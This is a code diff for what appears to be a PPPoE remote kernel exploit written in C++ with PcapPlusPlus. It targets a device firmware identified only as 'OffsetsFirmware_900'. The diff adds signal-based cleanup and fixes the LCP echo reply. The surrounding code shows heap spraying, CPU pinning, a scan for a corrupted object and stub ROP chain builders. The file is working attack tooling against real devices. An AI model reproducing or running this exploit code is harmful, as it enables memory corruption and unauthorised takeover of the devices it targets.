@@ -1,14 +1,4 @@
 
-#ifdef _WIN32
-#define WIN32_LEAN_AND_MEAN
-
-#include <windows.h>
-
-#else
-#include <csignal>
-#include <unistd.h>
-#endif
-
 #include <iostream>
 #include <sstream>
 
@@ -29,6 +19,24 @@
 
 #include "offset.h"
 #include "defines.h"
+
+#ifdef _WIN32
+void cleanUP(int ret) {
+    exit(ret);
+}
+#else
+#include <csignal>
+#include <unistd.h>
+static pid_t pid;
+void cleanUP(int ret) {
+    if( pid > 0) kill(pid, SIGKILL);
+    exit(ret);
+}
+static void signal_handler(int sig_num) {
+    signal(sig_num, signal_handler);
+    cleanUP(sig_num);
+}
+#endif
 
 #define SPRAY_NUM 0x1000
 #define PIN_NUM 0x1000
@@ -206,8 +214,9 @@ public:
                     pcpp::EthLayer ether(srcMac, dstMac, PCPP_ETHERTYPE_PPPOES);
                     pcpp::PPPoESessionLayer pppoeLayer(1, 1, pppLayer->getPPPoEHeader()->sessionId, PCPP_PPP_LCP);
                     pcpp::PayloadLayer lcpEchoReply = buildPPPLayer(pppoeLayer, ECHO_REPLY,
-                                                                    pppLayer->getLayerPayload()[1],
-                                                                    nullptr, 0);
+                                                                    pppLayer->getLayerPayload()[1],  // id
+                                                                    &pppLayer->getLayerPayload()[4], // magic number
+                                                                    sizeof(uint32_t));
 
                     pcpp::Packet echoReply;
                     echoReply.addLayer(&ether);
@@ -238,7 +247,7 @@ public:
         dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(iface);
         if (dev == nullptr) {
             std::cerr << "[-] Cannot find interface with name of '" << iface << "'" << std::endl;
-            exit(1);
+            cleanUP(1);
         }
 
         // open the device before start capturing/sending packets
@@ -246,7 +255,7 @@ public:
         config.direction = pcpp::PcapLiveDevice::PCPP_IN;
         if (!dev->open(config)) {
             std::cerr << "[-] Cannot open device" << std::endl;
-            exit(1);
+            cleanUP(1);
         }
 
         if (!dev->setFilter(BPF_FILTER)) {
@@ -415,7 +424,7 @@ public:
             auto *layer = getPPPoESessionLayer(pkt.packet, PCPP_PPP_IPCP);
             if (!layer) {
                 std::cerr << "[-] No IPCP layer found in packet" << std::endl;
-                exit(1);
+                cleanUP(1);
             }
             uint8_t id = layer->getLayerPayload()[1];
             uint8_t *options = layer->getLayerPayload() + 4;
@@ -460,7 +469,7 @@ public:
         auto *pppoeDiscoveryLayer = pkt.packet.getLayerOfType<pcpp::PPPoEDiscoveryLayer>();
         if (!pppoeDiscoveryLayer) {
             std::cerr << "[-] No PPPoE discovery layer found in PADI packet" << std::endl;
-            exit(1);
+            cleanUP(1);
         }
         uint8_t *host_uniq = nullptr;
         pcpp::PPPoEDiscoveryLayer::PPPoETag tag = pppoeDiscoveryLayer->getFirstTag();
@@ -473,11 +482,11 @@ public:
         }
         if (!host_uniq) {
             std::cerr << "[-] No host-uniq tag found in PADI packet" << std::endl;
-            exit(1);
+            cleanUP(1);
         }
         if (tag.getDataSize() != sizeof(uint64_t)) {
             std::cerr << "[-] Invalid host-uniq tag size: " << tag.getDataSize() << std::endl;
-            exit(1);
+            cleanUP(1);
         }
 
         memcpy(&pppoe_softc, host_uniq, sizeof(pppoe_softc));
@@ -615,17 +624,17 @@ public:
     }
 
     static std::vector<uint8_t> build_fake_lle(Exploit *self) {
-        (void)self;
+        (void) self;
         return {};
     }
 
     static std::vector<uint8_t> build_first_rop(Exploit *self) {
-        (void)self;
+        (void) self;
         return {};
     }
 
     static std::vector<uint8_t> build_second_rop(Exploit *self) {
-        (void)self;
+        (void) self;
         return {};
     }
 
@@ -637,22 +646,22 @@ public:
         std::cout << "[*] Waiting for interface to be ready..." << std::endl;
         dev->startCaptureBlockingMode(
                 [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
-                    auto *exp = (Exploit *) cookie;
+                    auto *self = (Exploit *) cookie;
                     pcpp::Packet parsedPacket(packet, pcpp::ICMPv6);
                     if (!parsedPacket.isPacketOfType(pcpp::ICMPv6)) return false;
                     auto *layer = parsedPacket.getLayerOfType<pcpp::IcmpV6Layer>();
                     if (layer && layer->getMessageType() == pcpp::ICMPv6MessageType::ICMPv6_ROUTER_SOLICITATION) {
                         auto *ipv6Layer = parsedPacket.getLayerOfType<pcpp::IPv6Layer>();
                         if (!ipv6Layer) return false;
-                        exp->target_ipv6 = ipv6Layer->getSrcIPv6Address();
-                        std::cout << "[+] Target IPv6: " << exp->target_ipv6 << std::endl;
+                        self->target_ipv6 = ipv6Layer->getSrcIPv6Address();
+                        std::cout << "[+] Target IPv6: " << self->target_ipv6 << std::endl;
                         return true;
                     }
                     return false;
                 }, this, 0);
 
         for (size_t i = 0; i < SPRAY_NUM; i++) {
-            if (i % 0x10 == 0) {
+            if (i % 0x100 == 0) {
                 std::cout << "\r[*] Heap grooming..." << std::dec << 100 * i / SPRAY_NUM << "%" << std::flush;
             }
 
@@ -675,7 +684,6 @@ public:
 
             dev->startCaptureBlockingMode(
                     [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
-                        auto start = std::chrono::high_resolution_clock::now();
                         pcpp::Packet parsedPacket(packet, pcpp::ICMPv6);
                         if (!parsedPacket.isPacketOfType(pcpp::ICMPv6)) return false;
                         auto *layer = parsedPacket.getLayerOfType<pcpp::IcmpV6Layer>();
@@ -717,12 +725,12 @@ public:
             packet.addLayer(&ethLayer);
             hexdump(packet);
             for (int i = 0; i < PIN_NUM; ++i) {
-                if (i % 0x20 == 0) {
+                if (i % 0x100 == 0) {
                     std::cout << std::dec << "\r[*] Pinning to CPU 0..." << std::setfill('0') << std::setw(2)
                               << (100 * i / PIN_NUM) << "%" << std::flush;
                 }
                 dev->sendPacket(&packet);
-                 pcpp::multiPlatformMSleep(1);
+                pcpp::multiPlatformMSleep(1);
             }
         }
 
@@ -841,7 +849,7 @@ public:
 
         if (!corrupted) {
             std::cerr << "\r[-] Scanning for corrupted object...failed. Please retry." << std::endl;
-            exit(1);
+            cleanUP(1);
         }
 
         std::cout << "\r[+] Scanning for corrupted object...found " << sourceIpv6.str() << std::endl;
@@ -909,7 +917,10 @@ int main(int argc, char *argv[]) {
     Exploit exploit(OffsetsFirmware_900(), interfaceName);
     exploit.run();
 #else
-    pid_t pid = fork();
+    signal(SIGPIPE, SIG_IGN);
+    signal(SIGINT, signal_handler);
+    signal(SIGTERM, signal_handler);
+    pid = fork();
     if (pid < 0) {
         std::cerr << "[-] Cannot run LcpEchoHandler" << std::endl;
     } else if (pid == 0) {
